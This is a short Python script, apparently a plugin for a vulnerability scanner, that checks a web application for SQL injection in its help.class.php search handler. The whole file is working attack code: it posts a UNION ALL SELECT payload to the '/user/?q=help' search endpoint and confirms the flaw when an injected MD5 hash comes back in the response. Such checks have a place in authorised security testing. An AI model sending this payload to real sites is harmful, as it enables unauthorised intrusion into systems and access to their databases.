#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/user/?q=help&type=search&page=1&kw="
bug ="5d975967029ada386ba2980a04b7720e"
info ="/em/controller/action/help.class.php SQL Injection"
post ='") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL'

def main():
    res = HttpPost(url+payload,post+"#","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
